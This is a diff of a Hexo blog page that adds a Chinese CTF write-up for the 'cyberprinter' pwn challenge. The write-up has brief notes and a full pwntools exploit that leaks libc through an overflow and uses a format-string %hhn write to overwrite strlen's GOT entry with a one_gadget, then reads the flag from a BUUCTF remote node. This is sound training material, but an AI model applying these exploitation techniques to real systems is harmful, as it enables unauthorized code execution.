@@ -16,19 +16,23 @@
   <meta name="author" content="SayNOW">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
-<meta property="og:title" content="SayNOW">
-<meta property="og:url" content="http://example.com/2022/11/29/SayNOW/index.html">
+    <meta name="description" content="cyberprinter 第一次输入可以溢出，然后泄露libc地址  第二次输入利用格式字符串漏洞修改libc中的strlen的got地址为one gadget  puts内部会调用strlen，从而getshell  刚开始准备打__rtld_lock_unlock_recursive的  后来才发现程序结束调用的_exit不是exit  看官方wp后，可以修改返回地址到vuln中的exit打_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="旋瓶野格醒醒酒">
+<meta property="og:url" content="http://example.com/2022/11/30/cyberprinter/index.html">
 <meta property="og:site_name" content="旋瓶野格醒醒酒">
+<meta property="og:description" content="cyberprinter 第一次输入可以溢出，然后泄露libc地址  第二次输入利用格式字符串漏洞修改libc中的strlen的got地址为one gadget  puts内部会调用strlen，从而getshell  刚开始准备打__rtld_lock_unlock_recursive的  后来才发现程序结束调用的_exit不是exit  看官方wp后，可以修改返回地址到vuln中的exit打_">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-11-29T09:48:46.000Z">
-<meta property="article:modified_time" content="2022-11-29T09:48:46.650Z">
+<meta property="og:image" content="http://example.com/image/image_pd08JcXoQb.png">
+<meta property="article:published_time" content="2022-11-30T02:20:40.363Z">
+<meta property="article:modified_time" content="2022-11-29T18:03:26.000Z">
 <meta property="article:author" content="SayNOW">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/image_pd08JcXoQb.png">
   
   
   
-  <title>SayNOW - 旋瓶野格醒醒酒</title>
+  <title>旋瓶野格醒醒酒</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -193,7 +197,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="SayNOW"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -204,8 +208,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-29 17:48" pubdate>
-          2022年11月29日 下午
+        <time datetime="2022-11-30 10:20" pubdate>
+          2022年11月30日 上午
         </time>
       </span>
     
@@ -216,7 +220,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          2.8k 字
         
       </span>
     
@@ -227,7 +231,7 @@
         
         
         
-          1 分钟
+          24 分钟
         
       </span>
     
@@ -265,12 +269,37 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">SayNOW</h1>
+            <h1 style="display: none"></h1>
             
             
               <div class="markdown-body">
                 
-                
+                <h1 id="cyberprinter"><a href="#cyberprinter" class="headerlink" title="cyberprinter"></a>cyberprinter</h1><ul>
+<li><p>第一次输入可以溢出，然后泄露libc地址</p>
+</li>
+<li><p>第二次输入利用格式字符串漏洞修改libc中的strlen的got地址为one gadget</p>
+</li>
+<li><p>puts内部会调用strlen，从而getshell</p>
+</li>
+<li><p>刚开始准备打__rtld_lock_unlock_recursive的</p>
+</li>
+<li><p>后来才发现程序结束调用的_exit不是exit</p>
+</li>
+<li><p>看官方wp后，可以修改返回地址到vuln中的exit打__rtld_lock_unlock_recursive</p>
+</li>
+<li><p>不过只有十六分之一的概率成功</p>
+</li>
+</ul>
+<p><img src="/image/image_pd08JcXoQb.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs 纯文本">from pwncli import *<br><br>context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)<br># a = process(&#x27;./cyberprinter&#x27;)<br># a = gdb.debug(&#x27;./black_watch&#x27;, &#x27;b *$rebase(0x191F)&#x27;)<br>elf = ELF(&#x27;./cyberprinter&#x27;)<br><br><br># gdb.attach(a, &#x27;b *$rebase(0x13A0)&#x27;)<br>def exp():<br>    libc = ELF(&#x27;./libc-2.31.so&#x27;)<br>    a = remote(&#x27;node4.buuoj.cn&#x27;, 27550)<br>    a.recvuntil(&#x27;Your name?pls..\n&#x27;)<br>    a.send(b&#x27;a&#x27;*0x18)<br>    a.recvuntil(&#x27;a&#x27;*0x18)<br>    stderr = u64(a.recv(6).ljust(8, b&#x27;\x00&#x27;))<br>    base = stderr-libc.sym[&#x27;_IO_2_1_stderr_&#x27;]<br>    __GI__IO_file_jumps = base+0x1ED4A0<br>    __GI__IO_file_jumps = __GI__IO_file_jumps+0x38<br>    rt_global = stderr+0x35aa0<br>    _dl_rtld_unlock_recursive = rt_global+3856<br>    one = base+0xe6aee<br>    one1 = base+0xe6af1<br>    exit_hook = base+0x1ed608<br>    print(hex(stderr))<br>    a.recvuntil(&quot;But there is sth wrong in it,so you can&#x27;t do sth\n&quot;)<br>    print(hex(base))<br>    cur = one &amp; 0xff<br>    p = b&#x27;%&#x27;+str(cur).encode(&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%15$hhn&#x27;<br>    if ((one &amp; 0xff00) &gt;&gt; 8) &gt; cur:<br>        n = ((one &amp; 0xff00) &gt;&gt; 8)-cur<br>        cur = ((one &amp; 0xff00) &gt;&gt; 8)<br>    else:<br>        n = ((one &amp; 0xff00) &gt;&gt; 8)+0x100-cur<br>        cur = ((one &amp; 0xff00) &gt;&gt; 8)+0x100<br>    p += b&#x27;%&#x27;+str(n).encode(&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%16$hhn&#x27;<br>    if (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8) &gt; cur:<br>        n = (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8)-cur<br>        cur = (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8)<br>    else:<br>        if cur &lt; 0x100:<br>            n = (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8)+0x100-cur<br>            cur = (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8)+0x100<br>        else:<br>            n = (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8)+0x200-cur<br>            cur = (((one &amp; 0xff0000) &gt;&gt; 8) &gt;&gt; 8)+0x200<br>    strlen_got = base+0x1EB0A8<br>    got = 0x7f10db90c0a8 - 0x7f10db721000 + base<br>    p += b&#x27;%&#x27;+str(n).encode(&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%17$hhn&#x27;<br>    print(cur)<br>    if cur &amp; 0xff &lt;= 0x87:<br>        n = (0x87-(cur &amp; 0xff))<br>    else:<br>        n = 0x100+0x87-(cur &amp; 0xff)<br>    p += b&#x27;%&#x27;+str(n).encode(&#x27;utf-8&#x27;)+b&#x27;c&#x27;+b&#x27;%20$hhn&#x27;<br>    p = p.ljust(0x38, b&#x27;\x00&#x27;)<br>    p += p64(_dl_rtld_unlock_recursive)+p64(_dl_rtld_unlock_recursive+1)+p64(_dl_rtld_unlock_recursive+2)+p64(0)+p64(0)+p8(0x58)<br>    print(hex(base+0x1ed608))<br>    a.send(p)<br>    a.recv()<br>    print(hex(base))<br>    print(hex(one))<br>    sleep(1)<br>    a.sendline(&#x27;cat flag&#x27;)<br>    Suc = a.can_recv(timeout=3)<br>    if not Suc:<br>        a.close()<br>        return b&#x27;no&#x27;<br>    else:<br>        return a.recvall(timeout=4)<br>    # a.interactive()<br>    # b *$rebase(0x13A0)<br><br>while True:<br>    flag=exp()<br>    if flag!=b&#x27;no&#x27;:<br>        break<br>print(flag)<br><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>改strlen_got为one gadget可以直接get shell，one gadget要用one1</p>
+</li>
+<li><p>不过这是非预期解，把puts删掉或者换成printf都不行</p>
+</li>
+</ul>
+
                 
               </div>
             
@@ -287,8 +316,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>SayNOW</div>
-      <div>http://example.com/2022/11/29/SayNOW/</div>
+      <div></div>
+      <div>http://example.com/2022/11/30/cyberprinter/</div>
     </div>
     <div class="license-meta">
       
@@ -300,7 +329,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年11月29日</div>
+          <div>2022年11月30日</div>
         </div>
       
       
@@ -332,18 +361,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/11/30/cyberprinter/" title="">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/29/hello-world/" title="Hello World">
-                        <span class="hidden-mobile">Hello World</span>
+                      <a href="/2022/11/29/SayNOW/" title="SayNOW">
+                        <span class="hidden-mobile">SayNOW</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
